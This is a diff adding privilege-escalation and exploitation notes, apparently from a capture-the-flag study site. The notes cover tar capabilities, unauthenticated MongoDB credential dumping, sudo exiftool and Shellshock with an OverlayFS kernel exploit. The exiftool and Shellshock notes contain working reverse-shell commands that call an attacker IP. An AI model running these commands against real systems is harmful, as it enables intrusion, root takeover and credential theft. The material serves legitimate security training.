@@ -8782,6 +8782,92 @@
   },
   {
     "id": 32,
+    "slug": "cap_dac_read_search",
+    "title": "Cap_dac_read_search",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Binaries-Exploitation/GETCAP/cap_dac_read_search.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "caps-enumeration-phase1",
+        "text": "Phase 1: Privilege Escalation via Linux Capabilities (tar)"
+      },
+      {
+        "type": "order_block",
+        "id": "caps-logic-dac-read",
+        "text": "Linux <highlight>Capabilities</highlight> break down root privileges into smaller, distinct permissions. The <highlight>cap_dac_read_search</highlight> capability specifically allows a process to bypass all File Read and Directory Search permissions (DAC). When applied to a versatile tool like <highlight>tar</highlight>, any user can archive and subsequently read any file on the system, including those owned by root."
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-discovery-tar",
+        "text": "Step 1: Identifying the Vulnerable Capability"
+      },
+      {
+        "type": "order_block",
+        "id": "getcap-enumeration",
+        "text": "Using <highlight>getcap</highlight> recursively allows us to find binaries with extra powers. In this environment, we look for the <highlight>+ep</highlight> flags, which mean the capability is Effective and Permitted immediately upon execution."
+      },
+      {
+        "type": "code_block",
+        "id": "getcap-tar-command",
+        "language": "bash",
+        "code": "# Identify binaries with specific capabilities\ngetcap / -r 2>/dev/null"
+      },
+      {
+        "type": "output_block",
+        "id": "getcap-tar-output",
+        "language": "text",
+        "code": "/usr/bin/mtr-packet = cap_net_raw+ep\n/bin/tar = cap_dac_read_search+ep"
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-exploitation-tar",
+        "text": "Step 2: Exploiting cap_dac_read_search"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-exploit-logic",
+        "text": "Because <highlight>tar</highlight> can read any file, we can archive the <highlight>/root</highlight> directory. Even though we cannot 'cd' into it, the binary can 'read' it to create the archive. Writing the output to <highlight>/tmp</highlight> ensures we bypass any directory write restrictions in the home folder."
+      },
+      {
+        "type": "code_block",
+        "id": "tar-exploit-commands",
+        "language": "bash",
+        "code": "# Archive the restricted directory\ntar -cvf /tmp/root_leak.tar /root\n\n# Extract the archive in a writable directory to claim ownership\ncd /tmp\ntar -xvf root_leak.tar"
+      },
+      {
+        "type": "section_heading",
+        "id": "caps-results",
+        "text": "Step 3: Accessing the Loot"
+      },
+      {
+        "type": "order_block",
+        "id": "flag-retrieval",
+        "text": "Once extracted, the file structure from <highlight>/root</highlight> is recreated in <highlight>/tmp</highlight>. Since the current user owns the extracted files, the DAC restrictions no longer apply, allowing us to read the root flag."
+      },
+      {
+        "type": "code_block",
+        "id": "cat-flag-command",
+        "language": "bash",
+        "code": "cat /tmp/root/root.txt"
+      },
+      {
+        "type": "explanation",
+        "id": "caps-dac-read-summary",
+        "title": "Key Takeaways",
+        "items": [
+          "Vulnerability: Binary granted cap_dac_read_search+ep",
+          "Nuance: '+ep' ensures the capability is active without specialized API calls",
+          "Technique: Use 'tar' to bridge the gap between 'Read-Protected' and 'User-Owned' files",
+          "Impact: Full filesystem read access, leading to Flag retrieval and sensitive file exposure"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 32,
     "slug": "getcap",
     "title": "GetCap",
     "isLab": false,
@@ -11136,6 +11222,330 @@
           "Discovery: Always check group memberships during local enumeration",
           "Technique: Filesystem mounting allows complete bypass of host-based access controls",
           "Defense: Limit docker group access; use the Docker socket only via sudo or root"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 53,
+    "slug": "mongodb",
+    "title": "Enumerating MongoDB",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Pentesting-tools/Enumerating-Databases/mongo.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "mongo-shell-access-intro",
+        "text": "Phase 1: Internal Database Enumeration (Native MongoDB Shell)"
+      },
+      {
+        "type": "order_block",
+        "id": "mongo-shell-logic",
+        "text": "Once internal enumeration confirms <highlight>MongoDB</highlight> is listening on <highlight>127.0.0.1:27017</highlight>, the most efficient way to extract data is by spawning a native <highlight>mongo shell</highlight>. This allows for direct interaction with the database engine to find administrative users and credentials."
+      },
+      {
+        "type": "section_heading",
+        "id": "mongo-connection",
+        "text": "Step 1: Connecting to Localhost Instance"
+      },
+      {
+        "type": "order_block",
+        "id": "mongo-connect-logic",
+        "text": "We attempt to connect to the local MongoDB instance. If the binary is present, we can access the database without credentials if no authentication is enabled for local connections."
+      },
+      {
+        "type": "code_block",
+        "id": "mongo-connect-cmd",
+        "language": "bash",
+        "code": "# Connect to the local MongoDB instance\nmongo --host 127.0.0.1"
+      },
+      {
+        "type": "section_heading",
+        "id": "mongo-show-dbs",
+        "text": "Step 2: Enumerating Databases"
+      },
+      {
+        "type": "order_block",
+        "id": "show-dbs-logic",
+        "text": "Using the <highlight>show dbs</highlight> command, we list all available databases on the server. We specifically look for non-standard databases like <highlight>cockpit</highlight> that likely contain application-specific data."
+      },
+      {
+        "type": "code_block",
+        "id": "mongo-dbs-cmd",
+        "language": "javascript",
+        "code": "> show dbs"
+      },
+      {
+        "type": "output_block",
+        "id": "mongo-dbs-output",
+        "language": "text",
+        "code": "admin    0.000GB\nconfig   0.000GB\nlocal    0.000GB\ncockpit  0.001GB"
+      },
+      {
+        "type": "section_heading",
+        "id": "mongo-use-db",
+        "text": "Step 3: Selecting the Database and Listing Collections"
+      },
+      {
+        "type": "order_block",
+        "id": "use-db-logic",
+        "text": "We switch context to the target database and use <highlight>show collections</highlight> (equivalent to show tables in SQL) to see the underlying data structures."
+      },
+      {
+        "type": "code_block",
+        "id": "mongo-collections-cmd",
+        "language": "javascript",
+        "code": "> use cockpit\nswitched to db cockpit\n> show collections"
+      },
+      {
+        "type": "output_block",
+        "id": "mongo-collections-output",
+        "language": "text",
+        "code": "accounts\ncollections\nforms\nregions\nstorage"
+      },
+      {
+        "type": "section_heading",
+        "id": "mongo-dump-users",
+        "text": "Step 4: Extracting User Credentials"
+      },
+      {
+        "type": "order_block",
+        "id": "find-pretty-logic",
+        "text": "We query the <highlight>accounts</highlight> collection using the <highlight>.find().pretty()</highlight> method. This retrieves all documents in a readable format, revealing the username and bcrypt password hash for the system user."
+      },
+      {
+        "type": "code_block",
+        "id": "mongo-find-cmd",
+        "language": "javascript",
+        "code": "> db.accounts.find().pretty()"
+      },
+      {
+        "type": "output_block",
+        "id": "mongo-find-output",
+        "language": "text",
+        "code": "{\n\t\"_id\" : ObjectId(\"60a80... \"),\n\t\"user\" : \"stux\",\n\t\"password\" : \"$2y$10$hashed_bcrypt_string...\",\n\t\"email\" : \"stux@cmspit.thm\",\n\t\"active\" : true,\n\t\"group\" : \"admin\"\n}"
+      },
+      {
+        "type": "section_heading",
+        "id": "mongo-fallback-heading",
+        "text": "Step 5: Fallback - Interaction via Python (No-Binary Environment)"
+      },
+      {
+        "type": "order_block",
+        "id": "mongo-python-logic",
+        "text": "If the <highlight>mongo</highlight> binary is missing, we use a <highlight>Python3</highlight> one-liner with the <highlight>pymongo</highlight> library to manually execute the same database enumeration tasks."
+      },
+      {
+        "type": "code_block",
+        "id": "mongo-python-fallback",
+        "language": "bash",
+        "code": "# Show Databases\npython3 -c \"import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); print(c.list_database_names())\"\n\n# Show Collections (Tables)\npython3 -c \"import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); db = c['cockpit']; print(db.list_collection_names())\"\n\n# Dump Collection Data\npython3 -c \"import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); db = c['cockpit']; print(list(db['accounts'].find()))\""
+      },
+      {
+        "type": "explanation",
+        "id": "mongo-shell-summary",
+        "title": "Post-Exploitation Takeaways",
+        "items": [
+          "Discovery: Services on 127.0.0.1 often bypass external security policies",
+          "Commands: Use 'show dbs', 'use [db]', and 'show collections' for fast enumeration",
+          "Technique: Always check for local 'No-Auth' configurations in MongoDB",
+          "Fallback: Use Python 'pymongo' if native client binaries are unavailable"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 53,
+    "slug": "exiftool",
+    "title": "Exiftool",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Binaries-Exploitation/exiftool.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "exiftool-priv-esc-intro",
+        "text": "Phase 1: Privilege Escalation via ExifTool (CVE-2021-22204)"
+      },
+      {
+        "type": "order_block",
+        "id": "exiftool-logic",
+        "text": "Identifying a binary like <highlight>exiftool</highlight> in the <highlight>sudo -l</highlight> output is a major privilege escalation vector. Versions prior to <highlight>12.24</highlight> are vulnerable to a command injection flaw where user-supplied metadata is improperly handled by a Perl <highlight>eval()</highlight> function."
+      },
+      {
+        "type": "section_heading",
+        "id": "exiftool-discovery",
+        "text": "Step 1: Checking Sudo Permissions and Version"
+      },
+      {
+        "type": "order_block",
+        "id": "version-check-logic",
+        "text": "We first check our sudo privileges to see if we can run the binary as root. Then, we verify the version to confirm it is within the vulnerable range for <highlight>CVE-2021-22204</highlight>."
+      },
+      {
+        "type": "code_block",
+        "id": "check-exif-version",
+        "language": "bash",
+        "code": "# Check sudo permissions\nsudo -l\n\n# Check ExifTool version\n/usr/local/bin/exiftool -ver"
+      },
+      {
+        "type": "output_block",
+        "id": "exif-version-output",
+        "language": "text",
+        "code": "(root) NOPASSWD: /usr/local/bin/exiftool\n12.05"
+      },
+      {
+        "type": "section_heading",
+        "id": "exiftool-config-creation",
+        "text": "Step 2: Crafting the Malicious Config File"
+      },
+      {
+        "type": "order_block",
+        "id": "config-injection-logic",
+        "text": "By using a custom <highlight>.config</highlight> file, we can inject a Perl <highlight>BEGIN</highlight> block. This block executes immediately when ExifTool loads the configuration, allowing us to trigger a reverse shell as the root user before the tool even begins parsing an image."
+      },
+      {
+        "type": "code_block",
+        "id": "create-exif-config",
+        "language": "bash",
+        "code": "# Create a config file that spawns a reverse shell\necho 'BEGIN { system(\"bash -c \\\"bash -i >& /dev/tcp/192.168.192.228/4441 0>&1\\\"\") }' > /tmp/shell.config"
+      },
+      {
+        "type": "section_heading",
+        "id": "exiftool-execution",
+        "text": "Step 3: Triggering the Root Shell"
+      },
+      {
+        "type": "order_block",
+        "id": "run-exploit-logic",
+        "text": "We execute <highlight>exiftool</highlight> with <highlight>sudo</highlight> and point it to our malicious config file. We provide a dummy file (like /etc/passwd) as an argument to satisfy the tool's requirements while our payload executes in the background."
+      },
+      {
+        "type": "code_block",
+        "id": "execute-exif-sudo",
+        "language": "bash",
+        "code": "# Execute with sudo to catch the root shell\nsudo /usr/local/bin/exiftool -config /tmp/shell.config /etc/passwd"
+      },
+      {
+        "type": "explanation",
+        "id": "exiftool-summary",
+        "title": "ExifTool Exploit Takeaways",
+        "items": [
+          "Vulnerability: CVE-2021-22204 (Improper input validation in DjVu/Perl processing)",
+          "Discovery: Look for 'exiftool' in sudo -l or custom SUID lists",
+          "Technique: Using the '-config' flag to execute arbitrary Perl code during initialization",
+          "Advantage: The 'BEGIN' block bypasses the need for a valid image or specific metadata tags"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 54,
+    "slug": "shellshock",
+    "title": "ShellShock",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/shellshock/shellshock.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "shellshock-discovery",
+        "text": "Phase 1: Vulnerability Discovery (Manual Enumeration)"
+      },
+      {
+        "type": "order_block",
+        "id": "ss-enum-logic",
+        "text": "When <highlight>Nikto</highlight> is banned (CPTS style), use <highlight>ffuf</highlight> to find CGI directories. Look for <highlight>/cgi-bin/</highlight> and fuzz for <highlight>.cgi</highlight> or <highlight>.sh</highlight> extensions. These scripts often interact with <highlight>Bash</highlight>, making them targets for Shellshock."
+      },
+      {
+        "type": "code_block",
+        "id": "ss-fuzz-cmd",
+        "language": "bash",
+        "code": "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10/cgi-bin/FUZZ.cgi"
+      },
+      {
+        "type": "section_heading",
+        "id": "shellshock-exploitation-detailed",
+        "text": "Phase 2: Shellshock Manual Exploitation"
+      },
+      {
+        "type": "order_block",
+        "id": "ss-payload-breakdown",
+        "text": "The payload <highlight>() { :; };</highlight> exploits a bug where Bash continues executing code after a function definition. We inject this into the <highlight>User-Agent</highlight> header because the web server passes this header to the CGI script as an environment variable."
+      },
+      {
+        "type": "code_block",
+        "id": "ss-rce-verify",
+        "language": "bash",
+        "code": "# 1. Verify RCE with absolute paths\ncurl -H \"User-Agent: () { :; }; echo; /usr/bin/id\" http://10.10.10.10/cgi-bin/test.cgi\n\n# 2. Get Reverse Shell\ncurl -H \"User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\" http://10.10.10.10/cgi-bin/test.cgi"
+      },
+      {
+        "type": "order_block",
+        "id": "ss-echo-importance",
+        "text": "The <highlight>echo;</highlight> command is critical; it provides the necessary blank line in the HTTP response. Without it, the server returns a <highlight>500 Internal Server Error</highlight> even if the command executes."
+      },
+      {
+        "type": "section_heading",
+        "id": "path-environment-fix",
+        "text": "Phase 3: Troubleshooting the Environment (Broken GCC)"
+      },
+      {
+        "type": "order_block",
+        "id": "gcc-cc1-fix",
+        "text": "On older systems, <highlight>gcc</highlight> might fail with <highlight>error trying to exec 'cc1'</highlight>. This happens when the compiler's internal components are not in the <highlight>$PATH</highlight>. You must locate <highlight>cc1</highlight> manually and update the environment."
+      },
+      {
+        "type": "code_block",
+        "id": "path-commands",
+        "language": "bash",
+        "code": "# Find the hidden compiler component\nfind / -name cc1 2>/dev/null\n\n# Example output: /usr/lib/gcc/x86_64-linux-gnu/4.8/cc1\n# Add the DIRECTORY (not the file) to PATH\nexport PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/"
+      },
+      {
+        "type": "section_heading",
+        "id": "cross-compilation-ldd",
+        "text": "Phase 4: Advanced Compilation (Matching LDD/GLIBC)"
+      },
+      {
+        "type": "order_block",
+        "id": "ldd-matching-logic",
+        "text": "If <highlight>gcc</highlight> is missing on target, check the <highlight>ldd --version</highlight> to find the <highlight>GLIBC</highlight> version. To avoid 'GLIBC not found' errors, compile the exploit in a matching <highlight>Docker container</highlight> (e.g., Ubuntu 14.04) or use the <highlight>-static</highlight> flag to bundle all libraries."
+      },
+      {
+        "type": "code_block",
+        "id": "docker-build-cmds",
+        "language": "bash",
+        "code": "# On Attacker Machine (Matching Target OS)\ndocker run -it --name exploit_build ubuntu:14.04 /bin/bash\n\n# Inside Container\napt update && apt install gcc -y\ngcc exploit.c -o exploit_matched\n\n# On Attacker (Static Alternative)\ngcc exploit.c -o exploit_static -static"
+      },
+      {
+        "type": "section_heading",
+        "id": "kernel-privesc-overlay",
+        "text": "Phase 5: Privilege Escalation (The '0day' Path)"
+      },
+      {
+        "type": "order_block",
+        "id": "kernel-exploit-logic",
+        "text": "Systems vulnerable to Shellshock (circa 2014) often run outdated kernels like <highlight>3.13.0</highlight>. The <highlight>OverlayFS</highlight> exploit (CVE-2015-1328) allows a local user to escalate to <highlight>root</highlight> by exploiting improper permission handling in mount namespaces."
+      },
+      {
+        "type": "code_block",
+        "id": "compile-run-exploit",
+        "language": "bash",
+        "code": "# Identify Kernel\nuname -a\n\n# Transfer and Compile (since PATH is now fixed)\ngcc 37292.c -o exploit\nchmod +x exploit\n./exploit\n\n# Verify Root\nwhoami\nid"
+      },
+      {
+        "type": "explanation",
+        "id": "post-exploit-summary",
+        "title": "Post-Exploitation Checklist",
+        "items": [
+          "Always use Absolute Paths (/usr/bin/id) in Shellshock because the PATH variable might be empty.",
+          "Check /etc/lsb-release to confirm the Ubuntu version before picking a Kernel exploit.",
+          "If GCC is missing, check GLIBC version (ldd --version) and use a matching Docker container for compilation.",
+          "Upgrade your shell to a TTY (python3 pty.spawn) to handle interactive exploit prompts.",
+          "Capture the flag at /root/root.txt and /home/ryan/user.txt."
         ]
       }
     ]
